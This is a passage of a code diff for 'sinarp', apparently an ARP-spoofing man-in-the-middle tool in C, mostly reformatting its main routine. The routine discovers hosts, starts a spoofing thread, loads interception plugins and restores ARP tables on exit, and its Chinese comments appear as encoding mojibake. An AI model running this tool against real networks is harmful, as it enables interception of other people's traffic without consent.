-                sinarp_get_gw_from_ip(g_my_ip,&g_my_gw_addr);
+                sinarp_get_gw_from_ip(g_my_ip, &g_my_gw_addr);
 #ifdef WIN32
-                sinarp_get_mac_from_if_name(strchr(open_devs->name,'{'),g_my_mac);
+                sinarp_get_mac_from_if_name(strchr(open_devs->name, '{'), g_my_mac);
 #else
-                sinarp_get_mac_from_if_name(open_devs->name,g_my_mac);
+                sinarp_get_mac_from_if_name(open_devs->name, g_my_mac);
 #endif
                 break;
-            case AF_INET6: //²»Ö§³Ö ipv6
+            case AF_INET6: //ä¸æ”¯æŒ ipv6
                 break;
             default:
                 break;
             }
-            if(g_my_ip)
+            if (g_my_ip)
                 break;
         }
-        if(!g_my_ip) //Íø¿¨ÉÏÃæÃ»ÓĞÒ»¸ö¿ÉÓÃµÄ ip
+        if (!g_my_ip) //ç½‘å¡ä¸Šé¢æ²¡æœ‰ä¸€ä¸ªå¯ç”¨çš„ ip
         {
-            printf("can not find a ip bind on this NIC\n");
-            //printf("Íø¿¨ÉÏÃæÕÒ²»µ½Ò»¸ö¿ÉÓÃµÄip\n");
+            printf("can not find a ip bind on this adapter\n");
+            //printf("ç½‘å¡ä¸Šé¢æ‰¾ä¸åˆ°ä¸€ä¸ªå¯ç”¨çš„ip\n");
             goto clean;
         }
     }
-    //¸ù¾İÖĞ¼äÈËµÄip À´È·¶¨ ip µÄÇ°3Î»  netmask ¶¨ËÀÎª 255.255.255.0
+
+    sinarp_printf("get my ip %s\n", sinarp_iptos(g_my_ip));
+    //æ ¹æ®ä¸­é—´äººçš„ip æ¥ç¡®å®š ip çš„å‰3ä½  netmask å®šæ­»ä¸º 255.255.255.0
     M_ip = g_my_ip;
     M_ip &= 0x00FFFFFF;
     //DBG_MSG("M:%s\n",sinarp_iptos(M_ip));
     // init the host list
-    for (i = 0;i <= 0xFF;i++)
+    for (i = 0; i <= 0xFF; i++)
     {
         g_HostList[i].ip |= M_ip;
-        g_HostList[i].ip |= i<<24;
+        g_HostList[i].ip |= i << 24;
     }
-    //Ã²ËÆÒÑ¾­²»ĞèÒªÊ¹ÓÃµ½ Íø¿¨ĞÅÏ¢ÁË 
+    //è²Œä¼¼å·²ç»ä¸éœ€è¦ä½¿ç”¨åˆ° ç½‘å¡ä¿¡æ¯äº†
     pf_pcap_freealldevs(pdevs);
     pdevs = NULL;
     //check A
     //printf("A Host list:\n");
-    for (idx  = 0 ;idx <= 0xFF;idx ++)
+    for (idx  = 0 ; idx <= 0xFF; idx ++)
     {
-        if(g_HostList[idx].type == HOST_A)
+        if (g_HostList[idx].type == HOST_A)
         {
             //printf("\t%s\n",sinarp_iptos(g_HostList[idx].ip));
             ++host_count;
         }
     }
-    if(host_count < 1)
+    if (host_count < 1)
     {
-        //ÓÃ»§Ã»ÓĞÖ¸¶¨AÖ÷»ú¡¡ÄÇÃ´Ê¹ÓÃÄ¬ÈÏµÄÍø¹Ø
-        if(g_my_gw_addr == 0)
+        //ç”¨æˆ·æ²¡æœ‰æŒ‡å®šAä¸»æœºã€€é‚£ä¹ˆä½¿ç”¨é»˜è®¤çš„ç½‘å…³
+        if (g_my_gw_addr == 0)
         {
-            //Íø¹ØµØÖ·Ã»ÓĞÕıÈ·µÄ»ñÈ¡
+            //ç½‘å…³åœ°å€æ²¡æœ‰æ­£ç¡®çš„è·å–
             printf("Failed to get the gw ip !\n");
             goto clean;
         }
@@ -1986,122 +2214,147 @@ int  main(int argc ,char ** argv)
     //check B
     //printf("B Host list:\n");
     host_count = 0;
-    for (idx  = 0 ;idx <= 0xFF;idx ++)
+    for (idx  = 0 ; idx <= 0xFF; idx ++)
     {
-        if(g_HostList[idx].type == HOST_B)
+        if (g_HostList[idx].type == HOST_B)
         {
             //printf("\t%s\n",sinarp_iptos(g_HostList[idx].ip));
             ++host_count;
         }
     }
-    if(host_count < 1)
+    if (host_count < 1)
     {
         printf("you must special at least one B host !\n");
         goto clean;
     }
-    //°Ñ ×Ô¼ºµÄ ip  ´ÓÖ÷»úÁĞ±íµÄ A B ÖĞ³ıÈ¥
+    //æŠŠ è‡ªå·±çš„ ip  ä»ä¸»æœºåˆ—è¡¨çš„ A B ä¸­é™¤å»
     g_HostList[g_my_ip >> 24].type =  HOST_UNKNOWN;
-    //ÉèÖÃÒ»¸ö pcap µÄ filter À´ÈÃÎÒÃÇ²»²¶»ñ×Ô¼º·¢³öÈ¥µÄ°ü
-    sprintf(sniffer_filter,"ether src not  %02x:%02x:%02x:%02x:%02x:%02x",
-        g_my_mac[0],
-        g_my_mac[1],
-        g_my_mac[2],
-        g_my_mac[3],
-        g_my_mac[4],
-        g_my_mac[5]);
+    //è®¾ç½®ä¸€ä¸ª pcap çš„ filter æ¥è®©æˆ‘ä»¬ä¸æ•è·è‡ªå·±å‘å‡ºå»çš„åŒ…
+    sprintf(sniffer_filter, "ether src not  %02x:%02x:%02x:%02x:%02x:%02x",
+            g_my_mac[0],
+            g_my_mac[1],
+            g_my_mac[2],
+            g_my_mac[3],
+            g_my_mac[4],
+            g_my_mac[5]);
     if (pf_pcap_compile(g_adhandle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
     {
-        fprintf(stderr,"\nUnable to compile the packet filter\n");
+        fprintf(stderr, "\nUnable to compile the packet filter\n");
         /* Free the device list */
         goto clean;
     }
-    //ÉèÖÃ¹ıÂËÆ÷
+    //è®¾ç½®è¿‡æ»¤å™¨
     if (pf_pcap_setfilter(g_adhandle, &fcode) < 0)
     {
-        fprintf(stderr,"\nError setting the filter.\n");
+        fprintf(stderr, "\nError setting the filter.\n");
         /* Free the device list */
         goto clean;
     }
 
-    //Æô¶¯²¶»ñÏß³Ì £¬ÔÚ²¶»ñÏß³ÌÀïÃæ Èç¹û ÓĞÖ÷»úÏòÎÒÃÇ»Ø¸´ ARP ÇëÇóµÄ»° ÄÇÃ´ÎÒÃÇ¾Í¸üĞÂÎÒÃÇµÄÖ÷»ú±íÀïÃæµÄ MAC¡¡ĞÅÏ¢
-    sinarp_create_thread(sinarp_capture_thread,NULL);
-    Sleep(1000);//µÈ´ıÒ»ÃëÖÓ È·¶¨Êı¾İ°üµÄ²¶»ñ¿ªÊ¼ÁË
-    sinarp_printf("start capture.....\n");
-    //ÏÖÔÚ¾ÍÊÇÒªÉ¨Ãè´æ»îµÄÖ÷»ú »ñµÃÆä MAC µØÖ·ÁË
-    // ²»¹ØÊ²Ã´Çé¿ö ÎÒÃÇ¶¼³¢ÊÔ»ñÈ¡ÏÂ Íø¹ØµÄ mac µØÖ· Êı¾İ°ü×ª·¢µÄÊ±ºò »áÓÃµ½µÄ 
-    for (idx = 0 ;idx < 0xFF;idx++)
+    //å¯åŠ¨æ•è·çº¿ç¨‹ ï¼Œåœ¨æ•è·çº¿ç¨‹é‡Œé¢ å¦‚æœ æœ‰ä¸»æœºå‘æˆ‘ä»¬å›å¤ ARP è¯·æ±‚çš„è¯ é‚£ä¹ˆæˆ‘ä»¬å°±æ›´æ–°æˆ‘ä»¬çš„ä¸»æœºè¡¨é‡Œé¢çš„ MACã€€ä¿¡æ¯
+    sinarp_create_thread(sinarp_capture_thread, NULL);
+    Sleep(2000);//ç­‰å¾…ä¸€ç§’é’Ÿ ç¡®å®šæ•°æ®åŒ…çš„æ•è·å¼€å§‹äº†
+    //sinarp_printf("start capture.....\n");
+    //ç°åœ¨å°±æ˜¯è¦æ‰«æå­˜æ´»çš„ä¸»æœº è·å¾—å…¶ MAC åœ°å€äº†
+    // ä¸å…³ä»€ä¹ˆæƒ…å†µ æˆ‘ä»¬éƒ½å°è¯•è·å–ä¸‹ ç½‘å…³çš„ mac åœ°å€ æ•°æ®åŒ…è½¬å‘çš„æ—¶å€™ ä¼šç”¨åˆ°çš„
+    // process mac_string first
+    sinarp_process_mac_string(mac_string);
+
+    for (idx = 0 ; idx < 0xFF; idx++)
     {
-        switch(g_HostList[idx].type)
+        switch (g_HostList[idx].type)
         {
         case HOST_A:
         case HOST_B:
-            {
-                sinarp_send_arp(g_HostList[idx].ip);
-            }
-            break;
+        {
+            sinarp_send_arp(g_HostList[idx].ip);
+        }
+        break;
         default:
-            if(g_HostList[idx].ip == g_my_gw_addr)
+            if (g_HostList[idx].ip == g_my_gw_addr)
             {
                 sinarp_send_arp(g_my_gw_addr);
             }
             break;
         }
     }
-    Sleep(2000);//µÈ´ı5ÃëÖÓ ÈÃËùÓĞµÄÖ÷»ú¶¼»Ø¸´ÁËÎÒÃÇµÄ ARP ÇëÇó
-    //¼ì²â A B ÖĞ ÖÁÉÙ¸÷»ñÈ¡ÁËÒ»¸öÖ÷»úµÄ MAC µØÖ·
+    Sleep(2000);//ç­‰å¾…5ç§’é’Ÿ è®©æ‰€æœ‰çš„ä¸»æœºéƒ½å›å¤äº†æˆ‘ä»¬çš„ ARP è¯·æ±‚
+    //æ£€æµ‹ A B ä¸­ è‡³å°‘å„è·å–äº†ä¸€ä¸ªä¸»æœºçš„ MAC åœ°å€
     active_count_B = active_count_A = 0;
-    for (idx = 0;idx < 0xFF;idx ++)
+    for (idx = 0; idx < 0xFF; idx ++)
     {
-        switch(g_HostList[idx].type)
+        switch (g_HostList[idx].type)
         {
         case HOST_A:
+        {
+            //DBG_MSG("HOST_A: %d active : %d \n",idx,g_HostList[idx].active);
             // if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
-            if(g_HostList[idx].active == 1)
+            if (1 == g_HostList[idx].active)
                 ++active_count_A;
-            break;
+        }
+        break;
         case HOST_B:
+        {
+            //DBG_MSG("HOST_B: %d active : %d \n",idx,g_HostList[idx].active);
             //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
-            if(g_HostList[idx].active == 1)
+            if (1 == g_HostList[idx].active)
                 ++active_count_B;
-            break;
+        }
+        break;
+        case HOST_UNKNOWN:
+        {
+
+        }
+        break;
         default:
-            break;
+        {
+            DBG_MSG("unknown host type !\n");
+        }
+        break;
         }
     }
-    if(active_count_A < 1 || active_count_B < 1)
+
+    if (active_count_A < 1 || active_count_B < 1)
     {
-        printf("do not find ant active host~~\n");
+        if (active_count_A < 1)
+        {
+            sinarp_printf("sinarp do not find a active host in group A ! \n");
+        }
+        if (active_count_B < 1)
+        {
+            sinarp_printf("sinarp do not find a active host in group B ! \n");
+        }
         pf_pcap_breakloop(g_adhandle);
         goto clean;
     }
-    //´òÓ¡ÏÂ»î¶¯Ö÷»úÁĞ±í
+    //æ‰“å°ä¸‹æ´»åŠ¨ä¸»æœºåˆ—è¡¨
     sinarp_printf("Active host list:\n");
     sinarp_printf("M:\n");
     sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
-        sinarp_iptos(g_my_ip),
-        g_my_mac[0],
-        g_my_mac[1],
-        g_my_mac[2],
-        g_my_mac[3],
-        g_my_mac[4],
-        g_my_mac[5]);
+                  sinarp_iptos(g_my_ip),
+                  g_my_mac[0],
+                  g_my_mac[1],
+                  g_my_mac[2],
+                  g_my_mac[3],
+                  g_my_mac[4],
+                  g_my_mac[5]);
     sinarp_printf("A:\n");
-    for (idx = 0 ;idx < 0xFF ;idx ++)
+    for (idx = 0 ; idx < 0xFF ; idx ++)
     {
-        switch(g_HostList[idx].type)
+        switch (g_HostList[idx].type)
         {
         case HOST_A:
             //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
-            if(g_HostList[idx].active == 1)
+            if (g_HostList[idx].active == 1)
             {
                 sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
-                    sinarp_iptos(g_HostList[idx].ip),
-                    g_HostList[idx].mac[0],
-                    g_HostList[idx].mac[1],
-                    g_HostList[idx].mac[2],
-                    g_HostList[idx].mac[3],
-                    g_HostList[idx].mac[4],
-                    g_HostList[idx].mac[5]);
+                              sinarp_iptos(g_HostList[idx].ip),
+                              g_HostList[idx].mac[0],
+                              g_HostList[idx].mac[1],
+                              g_HostList[idx].mac[2],
+                              g_HostList[idx].mac[3],
+                              g_HostList[idx].mac[4],
+                              g_HostList[idx].mac[5]);
             }
             break;
         default:
@@ -2110,24 +2363,24 @@ int  main(int argc ,char ** argv)
     }
 
     sinarp_printf("B:\n");
-    for (idx = 0 ;idx < 0xFF ;idx ++)
+    for (idx = 0 ; idx < 0xFF ; idx ++)
     {
-        switch(g_HostList[idx].type)
+        switch (g_HostList[idx].type)
         {
         case HOST_A:
             break;
         case HOST_B:
             //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
-            if(g_HostList[idx].active == 1)
+            if (g_HostList[idx].active == 1)
             {
                 sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
-                    sinarp_iptos(g_HostList[idx].ip),
-                    g_HostList[idx].mac[0],
-                    g_HostList[idx].mac[1],
-                    g_HostList[idx].mac[2],
-                    g_HostList[idx].mac[3],
-                    g_HostList[idx].mac[4],
-                    g_HostList[idx].mac[5]);
+                              sinarp_iptos(g_HostList[idx].ip),
+                              g_HostList[idx].mac[0],
+                              g_HostList[idx].mac[1],
+                              g_HostList[idx].mac[2],
+                              g_HostList[idx].mac[3],
+                              g_HostList[idx].mac[4],
+                              g_HostList[idx].mac[5]);
             }
             break;
         default:
@@ -2135,61 +2388,56 @@ int  main(int argc ,char ** argv)
         }
     }
 
-	memcpy(g_my_gw_mac,g_HostList[g_my_gw_addr >> 24].mac,6);
+    memcpy(g_my_gw_mac, g_HostList[g_my_gw_addr >> 24].mac, 6);
 
-    if(g_auto_ip_forward == 0)
+    if (g_auto_ip_forward == 0)
     {
-          sinarp_printf("Warning:sinarp run without ip forward..\n");
+        sinarp_printf("Warning:sinarp run without ip forward..\n");
     }
-	//start load plugin
-	if(plugin_string)
-	{
-		sinarp_printf("\rloading plugin...\n");
-		sinarp_parse_plugin_string(plugin_string);
-	}
+    //start load plugin
+    if (plugin_string)
+    {
+        sinarp_printf("\rloading plugin...\n");
+        sinarp_parse_plugin_string(plugin_string);
+    }
     //check plugin
-    if(g_plugin_list.count < 1)
+    if (g_plugin_list.count < 1)
     {
         sinarp_printf("Warning: sinarp do not load any plugin !\n");
     }
     else
     {
-        //´òÓ¡ÏÂ¼ÓÔØµÄ²å¼şÁĞ±í
+        //æ‰“å°ä¸‹åŠ è½½çš„æ’ä»¶åˆ—è¡¨
         sinarp_printf("loaded plugin:\n");
-        for (idx =0;idx < g_plugin_list.count;idx ++)
+        for (idx = 0; idx < g_plugin_list.count; idx ++)
         {
-            sinarp_printf("\t%s\n",g_plugin_list.plugin[idx].name);
+            sinarp_printf("\t%s\n", g_plugin_list.plugin[idx].name);
         }
     }
-    //ÏÂÃæÆô¶¯ÆÛÆ­Ïß³Ì
-    sinarp_create_thread(sinarp_spoof_thread,NULL);
+    //ä¸‹é¢å¯åŠ¨æ¬ºéª—çº¿ç¨‹
+    sinarp_create_thread(sinarp_spoof_thread, NULL);
     Sleep(1000);
-#ifdef WIN32
-    SetConsoleCtrlHandler(HandlerRoutine, TRUE);
-#else
-    (void)setsignal(SIGPIPE, cleanup);
-    (void)setsignal(SIGTERM, cleanup);
-    (void)setsignal(SIGINT, cleanup);
-#endif
-    //µÈ´ıÕâÁ½¸öÏß³ÌÍË³ö°É¡£¡£¡£
+
+    //ç­‰å¾…è¿™ä¸¤ä¸ªçº¿ç¨‹é€€å‡ºå§ã€‚ã€‚ã€‚
     while (g_is_capture_thread_active || g_is_spoof_thread_active)
     {
         Sleep(100);
 #ifdef WIN32
-        sinarp_printf("\rprocessed packet %I64u",g_packet_count);
+        sinarp_printf("\rprocessed packet %I64u", g_packet_count);
 #else
-        sinarp_printf("\rprocessed packet %llu",g_packet_count);
+        sinarp_printf("\rprocessed packet %llu", g_packet_count);
 #endif
     }
-    //ÍË³öµÄÊ±ºò ³¢ÊÔÏòÁĞ±íÀïµÄÖ÷»ú·¢ËÍ ARP °ü »Ö¸´ÆäARP±í¡£¡£
+
+    //é€€å‡ºçš„æ—¶å€™ å°è¯•å‘åˆ—è¡¨é‡Œçš„ä¸»æœºå‘é€ ARP åŒ… æ¢å¤å…¶ARPè¡¨ã€‚ã€‚
     sinarp_printf("\rRestoring the ARPTable......\r\n");
-    sinarp_restore_arp_table();//»Ö¸´Á½´Î
+    sinarp_restore_arp_table();//æ¢å¤ä¸¤æ¬¡
     sinarp_restore_arp_table();
     sinarp_printf("\rbye....\n");
 clean:
-    if(pdevs)
+    if (pdevs)
         pf_pcap_freealldevs(pdevs);
-    if(g_plugin_list.count > 0)
+    if (g_plugin_list.count > 0)
         sinarp_free_plugin_list();
     return 0;
 }
